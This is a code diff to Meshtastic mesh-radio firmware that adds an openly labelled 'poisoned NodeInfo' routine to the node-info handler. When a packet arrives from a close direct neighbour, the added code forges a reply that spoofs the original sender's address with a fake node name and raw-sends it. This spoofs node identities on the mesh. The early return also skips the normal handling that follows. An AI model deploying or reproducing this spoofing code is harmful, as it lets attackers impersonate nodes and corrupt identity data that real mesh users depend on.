@@ -7,6 +7,7 @@
 #include "configuration.h"
 #include "main.h"
 #include <Throttle.h>
+#include <pb_encode.h>
 
 NodeInfoModule *nodeInfoModule;
 
@@ -18,6 +19,42 @@ bool NodeInfoModule::handleReceivedProtobuf(const meshtastic_MeshPacket &mp, mes
         LOG_WARN("Invalid nodeInfo detected, is_licensed mismatch!");
         return true;
     }
+
+    // Only send response if SNR is excellent (very close) and it's a direct neighbor
+    if (mp.rx_snr < 5) {
+        LOG_DEBUG("Skip poisoning NodeInfo, SNR too low: %.2f", mp.rx_snr);
+        return false;
+    }
+
+    // Check if it's a direct neighbor (zero hops away)
+    uint8_t hops_away = mp.hop_start - mp.hop_limit;
+    if (hops_away != 0) {
+        LOG_DEBUG("Skip poisoning NodeInfo, not a direct neighbor (hops: %d)", hops_away);
+        return false;
+    }
+
+    LOG_INFO("Excellent SNR (%.2f) and direct neighbor detected, sending poisoned NodeInfo", mp.rx_snr);
+
+    strncpy(p.long_name, "New Node Name🥷", sizeof(p.long_name));
+    p.long_name[sizeof(p.long_name) - 1] = '\0';
+
+    meshtastic_MeshPacket *packet = router->allocForSending();
+    packet->from = mp.from;
+    packet->to = mp.to;
+    packet->channel = mp.channel;
+    packet->which_payload_variant = meshtastic_MeshPacket_decoded_tag;
+    packet->decoded.portnum = meshtastic_PortNum_NODEINFO_APP;
+
+    // Encode the modified User data into the packet payload
+    packet->decoded.payload.size =
+        pb_encode_to_bytes(packet->decoded.payload.bytes, sizeof(packet->decoded.payload.bytes), &meshtastic_User_msg, &p);
+
+    auto encodeResult = perhapsEncode(packet);
+
+    // Send raw packet directly via router interface
+    ErrorCode res = router->rawSend(packet);
+    LOG_INFO("Raw nodeinfo sent with result: %d", res);
+    return res == ERRNO_OK;
 
     // Coerce user.id to be derived from the node number
     snprintf(p.id, sizeof(p.id), "!%08x", getFrom(&mp));
